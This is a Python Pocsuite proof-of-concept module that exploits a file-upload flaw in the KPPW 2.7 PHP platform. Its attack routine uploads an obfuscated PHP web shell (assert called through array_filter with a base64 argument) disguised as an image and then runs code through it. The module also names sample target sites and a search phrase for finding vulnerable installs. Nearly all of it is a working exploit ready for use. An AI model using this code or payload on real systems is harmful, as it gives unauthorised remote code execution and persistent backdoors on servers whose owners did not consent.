import re
import os
import urlparse
from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase


class TestPOC(POCBase):
    vulID = '91247'  # ssvid
    version = '1.0'
    author = ['Rice']
    vulDate = '2016-01-21'
    createDate = '2016-04-05'
    updateDate = '2016-04-05'
    references = ['http://www.seebug.org/vuldb/ssvid-91247']
    name = 'KPPW2.7 文件上传导致任意代码执行 PoC'
    appPowerLink = 'http://www.kppw.cn/'
    appName = 'KPPW'
    appVersion = 'v2.7'
    vulType = 'upload files'
    desc = '''
        KPPW网站程序使用PHP+MYSQL开发，程序框架采用面向对象MVC设计模式，WEB前端采用最流行的HTML5+CSS3开发框架Bootstrap支持响应式网页设计。
        产品业务核心功能是基于任务悬赏交易和用户服务商品交易为主构建一个C2C的电子商务交易平台，
        其主要交易对象是以用户为主的技能、经验、时间和智慧型商品。
        
        可通过关键词powered by kppw 2.7查找受影响的站点。
    '''

    samples = ['http://demo.kppw.cn/','http://www.202h.com','http://americacommercialnews.com']

    # 上传一句话
    def _attack(self):
        result = {}
        url = urlparse.urljoin(self.url,'index.php?do=ajax&view=upload&file_type=big&filename=filename')
        shell = "Ra<?php $e = $_REQUEST['e'];$arr = array($_POST['pass'],);array_filter($arr, base64_decode($e));?>"

        # 在本地新建一个文件
        f = open('s.php', 'wb+')
        f.write(shell)
        f.flush()
        f.close()

        #上传文件
        f = open('s.php','rb')
        files = [('filename', ('php.php',f, 'jpg'))]
        resp = req.post(url, files=files)
		
        # 删除本地刚创建的文件
        f.close()
        os.remove('s.php')

        # 匹配上传后的路径，并访问该路径验证是否上传成功
        match = re.findall(r'"(data\\\/uploads\\\/.*?\.php)"',resp.content)
        if match:
            url = urlparse.urljoin(self.url,'/'+match[0].replace('\\','')+'?e=YXNzZXJ0')
            head = {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            data = {
                'pass' : 'print_r(poctest);'
            }
            resp = req.post(url,headers=head,data=data)
            if resp.status_code == 200 and 'poctest' in resp.content:
                result['FileInfo'] = {}
                result['FileInfo']['Fileame'] = url
                result['FileInfo']['Content'] = shell
        
        return self.parse_output(result)

    def _verify(self):
        result = {}
        vulurl = urlparse.urljoin(self.url,'index.php?do=ajax&view=upload&file_type=big&filename=filename')
        shell = "Ra<?php echo pocpocpocpoctesttesttest;unlink(__FILE__);?>"

        # 在本地新建一个文件
        f = open('s.php', 'wb+')
        f.write(shell)
        f.flush()
        f.close()

        #上传文件
        f = open('s.php','rb')
        files = [('filename', ('php.php',f, 'jpg'))]
        resp = req.post(vulurl, files=files)
		
        # 删除本地刚创建的文件
        f.close()
        os.remove('s.php')

        # 匹配上传后的路径，并访问该路径验证是否上传成功，并删除已上传的文件
        match = re.findall(r'"(data\\\/uploads\\\/.*?\.php)"',resp.content)
        if match:
            url = urlparse.urljoin(self.url,'/'+match[0].replace('\\',''))

            resp = req.post(url)
            if resp.status_code == 200 and 'pocpocpocpoctesttesttest' in resp.content:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = vulurl
        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
